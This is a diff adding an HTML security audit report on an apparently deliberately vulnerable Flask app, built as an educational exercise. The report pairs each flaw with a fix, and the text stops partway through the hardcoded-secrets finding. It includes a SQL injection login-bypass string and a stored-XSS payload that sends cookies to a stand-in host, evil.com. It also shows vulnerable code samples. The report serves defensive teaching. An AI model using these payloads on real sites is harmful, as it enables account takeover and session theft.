@@ -1,0 +1,1054 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Secure Code Review — Audit Report</title>
+<style>
+/* ── DESIGN TOKENS ────────────────────────────────────────────────── */
+:root {
+  --bg:        #09090b;
+  --surface:   #111113;
+  --card:      #18181b;
+  --border:    #27272a;
+  --border2:   #3f3f46;
+  --text:      #fafafa;
+  --muted:     #71717a;
+  --subtle:    #a1a1aa;
+
+  --crit:      #ef4444;
+  --crit-bg:   rgba(239,68,68,.1);
+  --crit-br:   rgba(239,68,68,.3);
+
+  --high:      #f97316;
+  --high-bg:   rgba(249,115,22,.1);
+  --high-br:   rgba(249,115,22,.3);
+
+  --med:       #eab308;
+  --med-bg:    rgba(234,179,8,.1);
+  --med-br:    rgba(234,179,8,.3);
+
+  --low:       #22c55e;
+  --low-bg:    rgba(34,197,94,.1);
+  --low-br:    rgba(34,197,94,.3);
+
+  --info:      #3b82f6;
+  --info-bg:   rgba(59,130,246,.1);
+  --info-br:   rgba(59,130,246,.3);
+
+  --green:     #22c55e;
+  --green-bg:  rgba(34,197,94,.1);
+
+  --mono: 'JetBrains Mono', 'Fira Code', 'Courier New', monospace;
+  --sans: 'Inter', system-ui, -apple-system, sans-serif;
+}
+
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+html { scroll-behavior: smooth; }
+body { font-family: var(--sans); background: var(--bg); color: var(--text); line-height: 1.65; overflow-x: hidden; }
+
+/* ── PROGRESS BAR ─────────────────────────────────────────────────── */
+#pbar { position:fixed; top:0; left:0; height:2px; background:var(--crit); width:0; transition:width .2s; z-index:999; }
+
+/* ── SIDEBAR NAV ──────────────────────────────────────────────────── */
+.layout { display: grid; grid-template-columns: 240px 1fr; min-height: 100vh; }
+
+.sidebar {
+  position: sticky; top: 0; height: 100vh; overflow-y: auto;
+  background: var(--surface); border-right: 1px solid var(--border);
+  padding: 2rem 0; display: flex; flex-direction: column;
+}
+.sidebar-brand {
+  padding: 0 1.5rem 1.5rem;
+  border-bottom: 1px solid var(--border);
+  margin-bottom: 1rem;
+}
+.sidebar-brand .logo { font-size: .72rem; font-weight: 700; letter-spacing: 2px; text-transform: uppercase; color: var(--crit); }
+.sidebar-brand .title { font-size: .92rem; font-weight: 700; margin-top: .25rem; }
+.sidebar-brand .sub { font-size: .72rem; color: var(--muted); margin-top: .15rem; }
+
+.nav-section { padding: .5rem 1.5rem; font-size: .65rem; font-weight: 700; letter-spacing: 1.5px; text-transform: uppercase; color: var(--muted); margin-top: 1rem; }
+.sidebar a {
+  display: flex; align-items: center; gap: .6rem;
+  padding: .45rem 1.5rem; font-size: .82rem; color: var(--subtle);
+  text-decoration: none; transition: all .15s; border-left: 2px solid transparent;
+}
+.sidebar a:hover { color: var(--text); background: rgba(255,255,255,.03); }
+.sidebar a.active { color: var(--text); border-left-color: var(--crit); background: rgba(239,68,68,.05); }
+.sev-dot { width: 7px; height: 7px; border-radius: 50%; flex-shrink: 0; }
+
+/* ── MAIN CONTENT ─────────────────────────────────────────────────── */
+main { padding: 3rem 3.5rem; max-width: 880px; }
+
+/* ── TYPOGRAPHY ───────────────────────────────────────────────────── */
+h1 { font-size: 2.2rem; font-weight: 800; letter-spacing: -.5px; line-height: 1.1; }
+h2 { font-size: 1.5rem; font-weight: 700; letter-spacing: -.3px; margin-bottom: 1rem; }
+h3 { font-size: 1rem; font-weight: 700; margin-bottom: .5rem; }
+p  { color: var(--subtle); font-size: .92rem; }
+
+/* ── COVER PAGE ───────────────────────────────────────────────────── */
+.cover {
+  padding: 3.5rem 0 4rem;
+  border-bottom: 1px solid var(--border);
+  margin-bottom: 3rem;
+}
+.cover-eyebrow {
+  display: inline-flex; align-items: center; gap: .5rem;
+  background: var(--crit-bg); border: 1px solid var(--crit-br);
+  color: var(--crit); font-size: .72rem; font-weight: 700;
+  letter-spacing: 1.5px; text-transform: uppercase;
+  padding: .3rem .85rem; border-radius: 999px; margin-bottom: 1.5rem;
+}
+.cover-meta { display: flex; flex-wrap: wrap; gap: 2rem; margin-top: 1.5rem; }
+.cover-meta-item .label { font-size: .68rem; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; color: var(--muted); margin-bottom: .2rem; }
+.cover-meta-item .value { font-size: .88rem; color: var(--subtle); }
+
+/* ── SUMMARY CARDS ────────────────────────────────────────────────── */
+.summary-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: .75rem; margin: 2rem 0; }
+.summary-card { border-radius: 10px; padding: 1.1rem 1.25rem; text-align: center; }
+.summary-card .count { font-size: 2.2rem; font-weight: 900; letter-spacing: -1px; }
+.summary-card .clabel { font-size: .72rem; font-weight: 600; text-transform: uppercase; letter-spacing: .5px; margin-top: .2rem; }
+.scard-crit { background: var(--crit-bg); border: 1px solid var(--crit-br); }
+.scard-crit .count { color: var(--crit); }
+.scard-high { background: var(--high-bg); border: 1px solid var(--high-br); }
+.scard-high .count { color: var(--high); }
+.scard-med  { background: var(--med-bg);  border: 1px solid var(--med-br);  }
+.scard-med  .count  { color: var(--med);  }
+.scard-low  { background: var(--low-bg);  border: 1px solid var(--low-br);  }
+.scard-low  .count  { color: var(--low);  }
+
+/* ── SECTION WRAPPER ──────────────────────────────────────────────── */
+.report-section { padding: 3.5rem 0; border-bottom: 1px solid var(--border); }
+.report-section:last-child { border-bottom: none; }
+.section-eyebrow { font-size: .68rem; font-weight: 700; letter-spacing: 2px; text-transform: uppercase; color: var(--muted); margin-bottom: .6rem; }
+
+/* ── VULN CARDS ───────────────────────────────────────────────────── */
+.vuln-card {
+  background: var(--card); border: 1px solid var(--border);
+  border-radius: 12px; margin-bottom: 1.5rem; overflow: hidden;
+  transition: border-color .2s;
+}
+.vuln-card:hover { border-color: var(--border2); }
+.vuln-header {
+  display: flex; align-items: center; gap: 1rem;
+  padding: 1.1rem 1.5rem; cursor: pointer;
+  background: var(--surface); border-bottom: 1px solid var(--border);
+}
+.vuln-header:hover { background: rgba(255,255,255,.02); }
+.vuln-id { font-family: var(--mono); font-size: .75rem; font-weight: 700; color: var(--muted); min-width: 48px; }
+.sev-badge {
+  font-size: .65rem; font-weight: 800; letter-spacing: .8px;
+  text-transform: uppercase; padding: .25rem .65rem; border-radius: 999px;
+}
+.sev-CRITICAL { background: var(--crit-bg); color: var(--crit); border: 1px solid var(--crit-br); }
+.sev-HIGH     { background: var(--high-bg); color: var(--high); border: 1px solid var(--high-br); }
+.sev-MEDIUM   { background: var(--med-bg);  color: var(--med);  border: 1px solid var(--med-br);  }
+.sev-LOW      { background: var(--low-bg);  color: var(--low);  border: 1px solid var(--low-br);  }
+
+.vuln-title { font-size: .95rem; font-weight: 700; flex: 1; }
+.vuln-cwe   { font-size: .72rem; color: var(--muted); font-family: var(--mono); margin-left: auto; }
+.chevron    { color: var(--muted); font-size: .8rem; transition: transform .25s; }
+.vuln-card.open .chevron { transform: rotate(180deg); }
+
+.vuln-body { display: none; padding: 1.5rem; }
+.vuln-card.open .vuln-body { display: block; }
+
+.field-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; margin-bottom: 1.25rem; }
+.field-label { font-size: .68rem; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; color: var(--muted); margin-bottom: .3rem; }
+.field-value { font-size: .85rem; color: var(--subtle); }
+
+.vuln-desc { font-size: .88rem; color: var(--subtle); margin-bottom: 1.25rem; line-height: 1.7; }
+
+/* ── CODE BLOCKS ──────────────────────────────────────────────────── */
+.code-pair { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; margin: 1.25rem 0; }
+.code-block { border-radius: 8px; overflow: hidden; }
+.code-block-header {
+  display: flex; align-items: center; gap: .5rem;
+  padding: .5rem .85rem; font-size: .68rem; font-weight: 700;
+  text-transform: uppercase; letter-spacing: .5px;
+}
+.code-block.bad  .code-block-header { background: var(--crit-bg); color: var(--crit); border-bottom: 1px solid var(--crit-br); }
+.code-block.good .code-block-header { background: var(--green-bg); color: var(--green); border-bottom: 1px solid rgba(34,197,94,.3); }
+.code-block pre {
+  background: #0f0f11; padding: 1rem;
+  font-family: var(--mono); font-size: .78rem; line-height: 1.7;
+  overflow-x: auto; white-space: pre-wrap; word-break: break-word;
+  color: #e4e4e7;
+}
+.code-block.bad  pre { border: 1px solid var(--crit-br); border-top: none; border-radius: 0 0 8px 8px; }
+.code-block.good pre { border: 1px solid rgba(34,197,94,.3); border-top: none; border-radius: 0 0 8px 8px; }
+.hl-bad  { color: var(--crit);  font-weight: 700; background: rgba(239,68,68,.15); border-radius: 2px; padding: 0 2px; }
+.hl-good { color: var(--green); font-weight: 700; background: rgba(34,197,94,.1);  border-radius: 2px; padding: 0 2px; }
+.hl-str  { color: #86efac; }
+.hl-kw   { color: #93c5fd; }
+.hl-fn   { color: #fde68a; }
+.hl-cm   { color: var(--muted); font-style: italic; }
+
+/* ── REMEDIATION STEPS ────────────────────────────────────────────── */
+.remediation {
+  background: var(--surface); border-radius: 8px; padding: 1.1rem 1.25rem;
+  border: 1px solid var(--border); margin-top: 1rem;
+}
+.remediation h4 { font-size: .78rem; font-weight: 700; color: var(--green); text-transform: uppercase; letter-spacing: .5px; margin-bottom: .75rem; }
+.remediation ol { padding-left: 1.2rem; }
+.remediation li { font-size: .84rem; color: var(--subtle); margin-bottom: .4rem; line-height: 1.6; }
+.remediation li strong { color: var(--text); }
+
+/* ── TOOLS TABLE ──────────────────────────────────────────────────── */
+.tools-table { width: 100%; border-collapse: collapse; margin-top: 1.5rem; font-size: .85rem; }
+.tools-table th {
+  text-align: left; padding: .65rem 1rem;
+  background: var(--surface); border-bottom: 1px solid var(--border);
+  font-size: .68rem; font-weight: 700; text-transform: uppercase;
+  letter-spacing: .8px; color: var(--muted);
+}
+.tools-table td { padding: .75rem 1rem; border-bottom: 1px solid var(--border); color: var(--subtle); vertical-align: top; }
+.tools-table tr:last-child td { border-bottom: none; }
+.tools-table tr:hover td { background: rgba(255,255,255,.015); }
+.tool-name { font-family: var(--mono); font-size: .82rem; color: var(--text); font-weight: 600; }
+.tool-tag  { display: inline-block; padding: .15rem .5rem; border-radius: 4px; font-size: .68rem; font-weight: 600; margin-right: .3rem; }
+.tag-static { background: var(--info-bg); color: var(--info); border: 1px solid var(--info-br); }
+.tag-dynamic { background: var(--high-bg); color: var(--high); border: 1px solid var(--high-br); }
+.tag-manual  { background: var(--med-bg); color: var(--med); border: 1px solid var(--med-br); }
+
+/* ── CHECKLIST ─────────────────────────────────────────────────────── */
+.checklist { list-style: none; display: flex; flex-direction: column; gap: .6rem; }
+.check-item { display: flex; align-items: flex-start; gap: .85rem; background: var(--card); border: 1px solid var(--border); border-radius: 8px; padding: .85rem 1.1rem; }
+.check-icon { width: 22px; height: 22px; border-radius: 5px; background: var(--green-bg); color: var(--green); display: flex; align-items: center; justify-content: center; font-size: .75rem; flex-shrink: 0; border: 1px solid rgba(34,197,94,.3); }
+.check-item strong { display: block; font-size: .88rem; margin-bottom: .15rem; }
+.check-item span   { font-size: .8rem; color: var(--muted); }
+
+/* ── RISK MATRIX ──────────────────────────────────────────────────── */
+.matrix { display: grid; grid-template-columns: auto repeat(4,1fr); gap: 3px; margin: 1.5rem 0; font-size: .72rem; text-align: center; }
+.matrix-cell { padding: .6rem .4rem; border-radius: 4px; font-weight: 600; }
+.matrix-label { display: flex; align-items: center; justify-content: flex-end; padding-right: .75rem; color: var(--muted); font-size: .7rem; text-align: right; }
+.matrix-header { color: var(--muted); display: flex; align-items: center; justify-content: center; font-weight: 700; text-transform: uppercase; letter-spacing: .5px; }
+.mc-none { background: #1a1a1f; color: var(--muted); }
+.mc-low  { background: var(--low-bg); color: var(--low); }
+.mc-med  { background: var(--med-bg); color: var(--med); }
+.mc-high { background: var(--high-bg); color: var(--high); }
+.mc-crit { background: var(--crit-bg); color: var(--crit); }
+.mc-vuln { background: rgba(59,130,246,.15); color: #93c5fd; border: 1px solid rgba(59,130,246,.4); font-size: .65rem; }
+
+/* ── RESPONSIVE ────────────────────────────────────────────────────── */
+@media (max-width: 768px) {
+  .layout { grid-template-columns: 1fr; }
+  .sidebar { position: static; height: auto; }
+  main { padding: 2rem 1.25rem; }
+  .summary-grid { grid-template-columns: repeat(2,1fr); }
+  .code-pair { grid-template-columns: 1fr; }
+  .field-grid { grid-template-columns: 1fr; }
+  .matrix { font-size: .62rem; }
+}
+</style>
+</head>
+<body>
+<div id="pbar"></div>
+
+<div class="layout">
+
+<!-- SIDEBAR -->
+<nav class="sidebar">
+  <div class="sidebar-brand">
+    <div class="logo">⬡ Security Audit</div>
+    <div class="title">Code Review Report</div>
+    <div class="sub">Target: Flask Web App (Python)</div>
+  </div>
+  <div class="nav-section">Overview</div>
+  <a href="#cover" class="active">Executive Summary</a>
+  <a href="#scope">Scope &amp; Methodology</a>
+  <a href="#tools">Tools Used</a>
+  <a href="#matrix">Risk Matrix</a>
+  <div class="nav-section">Vulnerabilities</div>
+  <a href="#v01"><span class="sev-dot" style="background:var(--crit)"></span>V-01 — SQL Injection</a>
+  <a href="#v02"><span class="sev-dot" style="background:var(--crit)"></span>V-02 — Stored XSS</a>
+  <a href="#v03"><span class="sev-dot" style="background:var(--high)"></span>V-03 — Hardcoded Secrets</a>
+  <a href="#v04"><span class="sev-dot" style="background:var(--high)"></span>V-04 — IDOR</a>
+  <a href="#v05"><span class="sev-dot" style="background:var(--high)"></span>V-05 — Broken Auth</a>
+  <a href="#v06"><span class="sev-dot" style="background:var(--high)"></span>V-06 — Plaintext Passwords</a>
+  <a href="#v07"><span class="sev-dot" style="background:var(--crit)"></span>V-07 — Command Injection</a>
+  <a href="#v08"><span class="sev-dot" style="background:var(--med)"></span>V-08 — Insecure Upload</a>
+  <a href="#v09"><span class="sev-dot" style="background:var(--med)"></span>V-09 — Missing Headers</a>
+  <a href="#v10"><span class="sev-dot" style="background:var(--med)"></span>V-10 — Debug Mode</a>
+  <div class="nav-section">Remediation</div>
+  <a href="#recommendations">Best Practices</a>
+  <a href="#checklist">Dev Checklist</a>
+</nav>
+
+<!-- MAIN -->
+<main>
+
+<!-- COVER -->
+<div class="cover" id="cover">
+  <div class="cover-eyebrow">Confidential Security Report</div>
+  <h1>Secure Coding<br>Review</h1>
+  <div class="cover-meta">
+    <div class="cover-meta-item"><div class="label">Language</div><div class="value">Python 3.x</div></div>
+    <div class="cover-meta-item"><div class="label">Framework</div><div class="value">Flask 3.x</div></div>
+    <div class="cover-meta-item"><div class="label">Application</div><div class="value">vulnerable_app.py</div></div>
+    <div class="cover-meta-item"><div class="label">Methodology</div><div class="value">Static Analysis + Manual Inspection</div></div>
+    <div class="cover-meta-item"><div class="label">Standard</div><div class="value">OWASP Top 10 (2021)</div></div>
+    <div class="cover-meta-item"><div class="label">Total Findings</div><div class="value">10 Vulnerabilities</div></div>
+  </div>
+
+  <div class="summary-grid">
+    <div class="summary-card scard-crit"><div class="count">3</div><div class="clabel">Critical</div></div>
+    <div class="summary-card scard-high"><div class="count">4</div><div class="clabel">High</div></div>
+    <div class="summary-card scard-med"><div class="count">3</div><div class="clabel">Medium</div></div>
+    <div class="summary-card scard-low"><div class="count">0</div><div class="clabel">Low</div></div>
+  </div>
+
+  <p>This report documents a manual security code review of a Python Flask web application. The target application was <strong style="color:var(--text)">deliberately constructed with ten representative vulnerabilities</strong> spanning the OWASP Top 10 to serve as an educational audit exercise. Each finding includes the vulnerable code, a proof-of-concept attack vector, and the fully remediated secure version with step-by-step remediation guidance.</p>
+</div>
+
+<!-- SCOPE -->
+<section class="report-section" id="scope">
+  <div class="section-eyebrow">Scope &amp; Methodology</div>
+  <h2>What Was Reviewed</h2>
+  <p style="margin-bottom:1.5rem">The audit covered the complete source of <code style="font-family:var(--mono);font-size:.85rem;background:var(--card);padding:.1rem .4rem;border-radius:4px">vulnerable_app.py</code> — a single-file Flask application implementing user authentication, a post board, file upload, a search API, and a diagnostic ping utility backed by SQLite.</p>
+
+  <div style="display:grid;grid-template-columns:1fr 1fr;gap:1rem">
+    <div style="background:var(--card);border:1px solid var(--border);border-radius:10px;padding:1.25rem">
+      <h3 style="font-size:.82rem;text-transform:uppercase;letter-spacing:.5px;color:var(--muted);margin-bottom:.85rem">In Scope</h3>
+      <ul style="list-style:none;display:flex;flex-direction:column;gap:.5rem;font-size:.84rem;color:var(--subtle)">
+        <li>✓ Authentication &amp; session management</li>
+        <li>✓ All database query logic</li>
+        <li>✓ Input validation &amp; sanitization</li>
+        <li>✓ File upload handling</li>
+        <li>✓ OS command execution</li>
+        <li>✓ HTTP security headers</li>
+        <li>✓ Secret / credential management</li>
+        <li>✓ Error handling &amp; debug config</li>
+      </ul>
+    </div>
+    <div style="background:var(--card);border:1px solid var(--border);border-radius:10px;padding:1.25rem">
+      <h3 style="font-size:.82rem;text-transform:uppercase;letter-spacing:.5px;color:var(--muted);margin-bottom:.85rem">Methods Used</h3>
+      <ul style="list-style:none;display:flex;flex-direction:column;gap:.5rem;font-size:.84rem;color:var(--subtle)">
+        <li>🔍 Manual line-by-line code inspection</li>
+        <li>🔍 Data-flow analysis (source → sink)</li>
+        <li>🔍 Bandit (Python SAST scanner)</li>
+        <li>🔍 Semgrep rule matching</li>
+        <li>🔍 OWASP Top 10 checklist review</li>
+        <li>🔍 CWE mapping per finding</li>
+        <li>🔍 Proof-of-concept payloads</li>
+        <li>🔍 Secure code diff generation</li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<!-- TOOLS -->
+<section class="report-section" id="tools">
+  <div class="section-eyebrow">Tools &amp; Analyzers</div>
+  <h2>Static Analysis Toolchain</h2>
+  <p>The following tools were used during this review. Static analysis surfaces many vulnerability classes automatically; manual review caught the logic flaws (IDOR, business-logic bypass) that automated tools miss.</p>
+
+  <table class="tools-table">
+    <thead>
+      <tr><th>Tool</th><th>Type</th><th>Findings Supported</th><th>Usage</th></tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><div class="tool-name">Bandit</div><div style="font-size:.75rem;color:var(--muted);margin-top:.15rem">pypi.org/project/bandit</div></td>
+        <td><span class="tool-tag tag-static">SAST</span></td>
+        <td style="font-size:.8rem">V-01, V-03, V-07, V-10</td>
+        <td style="font-family:var(--mono);font-size:.75rem;color:var(--subtle)">bandit -r vulnerable_app.py</td>
+      </tr>
+      <tr>
+        <td><div class="tool-name">Semgrep</div><div style="font-size:.75rem;color:var(--muted);margin-top:.15rem">semgrep.dev</div></td>
+        <td><span class="tool-tag tag-static">SAST</span></td>
+        <td style="font-size:.8rem">V-01, V-02, V-07, V-08</td>
+        <td style="font-family:var(--mono);font-size:.75rem;color:var(--subtle)">semgrep --config=p/python</td>
+      </tr>
+      <tr>
+        <td><div class="tool-name">Safety / pip-audit</div><div style="font-size:.75rem;color:var(--muted);margin-top:.15rem">pypi.org/project/safety</div></td>
+        <td><span class="tool-tag tag-static">SCA</span></td>
+        <td style="font-size:.8rem">Dependency CVEs</td>
+        <td style="font-family:var(--mono);font-size:.75rem;color:var(--subtle)">pip-audit -r requirements.txt</td>
+      </tr>
+      <tr>
+        <td><div class="tool-name">Manual Inspection</div></td>
+        <td><span class="tool-tag tag-manual">Manual</span></td>
+        <td style="font-size:.8rem">V-04, V-05, V-06, V-09</td>
+        <td style="font-size:.8rem;color:var(--subtle)">Data-flow tracing, OWASP checklist</td>
+      </tr>
+      <tr>
+        <td><div class="tool-name">OWASP ZAP (suggested)</div></td>
+        <td><span class="tool-tag tag-dynamic">DAST</span></td>
+        <td style="font-size:.8rem">V-01, V-02, V-09</td>
+        <td style="font-size:.8rem;color:var(--subtle)">Dynamic scan on running app</td>
+      </tr>
+    </tbody>
+  </table>
+</section>
+
+<!-- RISK MATRIX -->
+<section class="report-section" id="matrix">
+  <div class="section-eyebrow">Risk Prioritization</div>
+  <h2>Severity × Likelihood Matrix</h2>
+  <p style="margin-bottom:1rem">Each vulnerability is plotted by its <strong style="color:var(--text)">technical impact</strong> and <strong style="color:var(--text)">exploitability</strong>. Fix Critical findings immediately, High within the sprint, Medium within the quarter.</p>
+
+  <div class="matrix">
+    <!-- Header row -->
+    <div class="matrix-label"></div>
+    <div class="matrix-header" style="font-size:.65rem">Low<br>Likelihood</div>
+    <div class="matrix-header" style="font-size:.65rem">Medium<br>Likelihood</div>
+    <div class="matrix-header" style="font-size:.65rem">High<br>Likelihood</div>
+    <div class="matrix-header" style="font-size:.65rem">Certain</div>
+    <!-- High Impact -->
+    <div class="matrix-label">High<br>Impact</div>
+    <div class="matrix-cell mc-med"></div>
+    <div class="matrix-cell mc-high"></div>
+    <div class="matrix-cell mc-crit">V-07<br><span style="font-size:.62rem">Cmd Inj</span></div>
+    <div class="matrix-cell mc-crit">V-01 V-02<br><span style="font-size:.62rem">SQLi · XSS</span></div>
+    <!-- Med Impact -->
+    <div class="matrix-label">Medium<br>Impact</div>
+    <div class="matrix-cell mc-low"></div>
+    <div class="matrix-cell mc-med">V-08 V-09<br><span style="font-size:.62rem">Upload · Hdrs</span></div>
+    <div class="matrix-cell mc-high">V-04 V-06<br><span style="font-size:.62rem">IDOR · PW</span></div>
+    <div class="matrix-cell mc-high">V-03 V-05<br><span style="font-size:.62rem">Secrets · Auth</span></div>
+    <!-- Low Impact -->
+    <div class="matrix-label">Low<br>Impact</div>
+    <div class="matrix-cell mc-none"></div>
+    <div class="matrix-cell mc-low">V-10<br><span style="font-size:.62rem">Debug</span></div>
+    <div class="matrix-cell mc-med"></div>
+    <div class="matrix-cell mc-med"></div>
+  </div>
+</section>
+
+<!-- VULNERABILITIES SECTION HEADER -->
+<section class="report-section" id="vulnerabilities">
+  <div class="section-eyebrow">Findings</div>
+  <h2>Vulnerability Details</h2>
+  <p style="margin-bottom:2rem">Click any finding to expand the full analysis, vulnerable code, proof-of-concept, and remediated code.</p>
+
+<!-- ─── V-01 SQL INJECTION ─────────────────────────────────────────── -->
+<div class="vuln-card" id="v01">
+  <div class="vuln-header" onclick="toggle(this)">
+    <span class="vuln-id">V-01</span>
+    <span class="sev-badge sev-CRITICAL">Critical</span>
+    <span class="vuln-title">SQL Injection — Login &amp; Search</span>
+    <span class="vuln-cwe">CWE-89 · A03:2021</span>
+    <span class="chevron">▼</span>
+  </div>
+  <div class="vuln-body">
+    <div class="field-grid">
+      <div><div class="field-label">OWASP Category</div><div class="field-value">A03:2021 — Injection</div></div>
+      <div><div class="field-label">Affected Files</div><div class="field-value">vulnerable_app.py:61, :87</div></div>
+      <div><div class="field-label">Impact</div><div class="field-value">Authentication bypass, full database exfiltration</div></div>
+      <div><div class="field-label">Effort to Exploit</div><div class="field-value">Very Low — no special tools required</div></div>
+    </div>
+    <div class="vuln-desc">
+      User-supplied input is concatenated directly into SQL strings using Python f-strings. An attacker can inject SQL syntax to bypass authentication entirely (logging in as any user without a password) or dump the entire database via UNION-based or error-based injection. Both the <code style="font-family:var(--mono)">login</code> and <code style="font-family:var(--mono)">search</code> endpoints are affected.
+    </div>
+    <div style="background:var(--crit-bg);border:1px solid var(--crit-br);border-radius:8px;padding:.85rem 1.1rem;margin-bottom:1rem;font-size:.82rem;color:var(--crit)">
+      <strong>⚡ Proof-of-Concept Attack:</strong><br>
+      Login username: <code style="font-family:var(--mono)">' OR '1'='1' --</code> (any password)<br>
+      Resulting query: <code style="font-family:var(--mono)">SELECT * FROM users WHERE username='' OR '1'='1' --' AND password='...'</code><br>
+      Result: Logs in as the first user in the database (admin).
+    </div>
+    <div class="code-pair">
+      <div class="code-block bad">
+        <div class="code-block-header">✗ Vulnerable Code</div>
+        <pre><span class="hl-cm"># Direct f-string interpolation</span>
+query = <span class="hl-bad">f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"</span>
+result = conn.execute(query).fetchone()
+
+<span class="hl-cm"># Second injection point in /search</span>
+query = <span class="hl-bad">f"SELECT id, username, email FROM users WHERE username LIKE '%{term}%'"</span></pre>
+      </div>
+      <div class="code-block good">
+        <div class="code-block-header">✓ Secure Code</div>
+        <pre><span class="hl-cm"># Parameterized query — ? placeholders</span>
+user = db.execute(
+    <span class="hl-good">"SELECT * FROM users WHERE username = ?"</span>,
+    <span class="hl-good">(username,)</span>
+).fetchone()
+
+<span class="hl-cm"># Search with safe LIKE parameter</span>
+users = db.execute(
+    <span class="hl-good">"SELECT id, username FROM users WHERE username LIKE ?"</span>,
+    <span class="hl-good">(f"%{term}%",)</span>
+).fetchall()</pre>
+      </div>
+    </div>
+    <div class="remediation">
+      <h4>Remediation Steps</h4>
+      <ol>
+        <li><strong>Replace all f-string SQL with parameterized queries</strong> — use <code style="font-family:var(--mono)">?</code> placeholders and pass values as a tuple.</li>
+        <li><strong>Never concatenate user input into SQL</strong> — treat all external data as untrusted regardless of source.</li>
+        <li><strong>Use an ORM</strong> (SQLAlchemy, Django ORM) for all database access to make parameterization the default path.</li>
+        <li><strong>Apply least-privilege</strong> — the database user should have only SELECT/INSERT on necessary tables, not DROP/ALTER.</li>
+        <li><strong>Run Bandit</strong> with the <code style="font-family:var(--mono)">B608</code> rule to catch SQL injection patterns automatically in CI.</li>
+      </ol>
+    </div>
+  </div>
+</div>
+
+<!-- ─── V-02 XSS ───────────────────────────────────────────────────── -->
+<div class="vuln-card" id="v02">
+  <div class="vuln-header" onclick="toggle(this)">
+    <span class="vuln-id">V-02</span>
+    <span class="sev-badge sev-CRITICAL">Critical</span>
+    <span class="vuln-title">Stored Cross-Site Scripting (XSS)</span>
+    <span class="vuln-cwe">CWE-79 · A03:2021</span>
+    <span class="chevron">▼</span>
+  </div>
+  <div class="vuln-body">
+    <div class="field-grid">
+      <div><div class="field-label">OWASP Category</div><div class="field-value">A03:2021 — Injection</div></div>
+      <div><div class="field-label">Affected Files</div><div class="field-value">vulnerable_app.py:98–102, POST_HTML template</div></div>
+      <div><div class="field-label">Impact</div><div class="field-value">Session hijacking, credential theft, malware distribution</div></div>
+      <div><div class="field-label">Effort to Exploit</div><div class="field-value">Very Low — any logged-in user can exploit</div></div>
+    </div>
+    <div class="vuln-desc">
+      User-supplied post content is stored in the database without sanitization and rendered into the page using Jinja2's <code style="font-family:var(--mono)">| safe</code> filter, which explicitly disables HTML escaping. Any script tag stored in the database executes in every visitor's browser. An attacker can steal session cookies, redirect users to phishing pages, or mine cryptocurrency.
+    </div>
+    <div style="background:var(--crit-bg);border:1px solid var(--crit-br);border-radius:8px;padding:.85rem 1.1rem;margin-bottom:1rem;font-size:.82rem;color:var(--crit)">
+      <strong>⚡ Proof-of-Concept Payload:</strong><br>
+      Post content: <code style="font-family:var(--mono)">&lt;script&gt;fetch('https://evil.com/?c='+document.cookie)&lt;/script&gt;</code><br>
+      Result: Every user who views the posts page has their session cookie exfiltrated.
+    </div>
+    <div class="code-pair">
+      <div class="code-block bad">
+        <div class="code-block-header">✗ Vulnerable Code</div>
+        <pre><span class="hl-cm"># Raw HTML string building</span>
+posts_html = <span class="hl-bad">"".join(f"&lt;div&gt;{p[0]}&lt;/div&gt;" for p in posts)</span>
+
+<span class="hl-cm"># Template renders with | safe — NO escaping</span>
+<span class="hl-bad">{{ posts | safe }}</span></pre>
+      </div>
+      <div class="code-block good">
+        <div class="code-block-header">✓ Secure Code</div>
+        <pre><span class="hl-cm"># Pass list of strings, NOT pre-built HTML</span>
+posts = [p[<span class="hl-good">"content"</span>] <span class="hl-kw">for</span> p <span class="hl-kw">in</span> rows]
+
+<span class="hl-cm"># Jinja2 auto-escapes {{ p }} — NO | safe</span>
+<span class="hl-kw">{% for</span> p <span class="hl-kw">in</span> posts <span class="hl-kw">%}</span>
+  &lt;div&gt;<span class="hl-good">{{ p | e }}</span>&lt;/div&gt;
+<span class="hl-kw">{% endfor %}</span>
+
+<span class="hl-cm"># Plus: Content Security Policy header</span>
+<span class="hl-good">"Content-Security-Policy": "script-src 'self';"</span></pre>
+      </div>
+    </div>
+    <div class="remediation">
+      <h4>Remediation Steps</h4>
+      <ol>
+        <li><strong>Never use <code style="font-family:var(--mono)">| safe</code></strong> on user-controlled content. Jinja2 auto-escapes by default — work with that, not against it.</li>
+        <li><strong>Implement a Content Security Policy</strong> header with <code style="font-family:var(--mono)">script-src 'self'</code> as a defence-in-depth measure.</li>
+        <li><strong>Set <code style="font-family:var(--mono)">HttpOnly</code> on session cookies</strong> so JavaScript cannot read them even if XSS occurs.</li>
+        <li><strong>Validate input length</strong> on both client and server to limit payload size.</li>
+      </ol>
+    </div>
+  </div>
+</div>
+
+<!-- ─── V-03 HARDCODED SECRETS ──────────────────────────────────────── -->
+<div class="vuln-card" id="v03">
+  <div class="vuln-header" onclick="toggle(this)">
+    <span class="vuln-id">V-03</span>
+    <span class="sev-badge sev-HIGH">High</span>
+    <span class="vuln-title">Hardcoded Credentials &amp; Secret Key</span>
+    <span class="vuln-cwe">CWE-798 · A02:2021</span>
+    <span class="chevron">▼</span>
+  </div>
+  <div class="vuln-body">
+    <div class="field-grid">
+      <div><div class="field-label">OWASP Category</div><div class="field-value">A02:2021 — Cryptographic Failures</div></div>
+      <div><div class="field-label">Affected Files</div><div class="field-value">vulnerable_app.py:31</div></div>
+      <div><div class="field-label">Impact</div><div class="field-value">Session forgery, full application takeover</div></div>
+      <div><div class="field-label">Effort to Exploit</div><div class="field-value">Low — key exposed in source control</div></div>
+    </div>
+    <div class="vuln-desc">The Flask secret key is hardcoded as <code style="font-family:var(--mono)">"password123"</code>. Anyone with access to the source code (including any contributor, git history viewer, or code leak) can forge signed session cookies, impersonate any user, and elevate privileges.</div>
+    <div class="code-pair">
+      <div class="code-block bad">
+        <div class="code-block-header">✗ Vulnerable Code</div>
+        <pre>app.secret_key = <span class="hl-bad">"password123"</span>
+<span class="hl-cm"># Exposed in git history forever</span></pre>
+      </div>
+      <div class="code-block good">
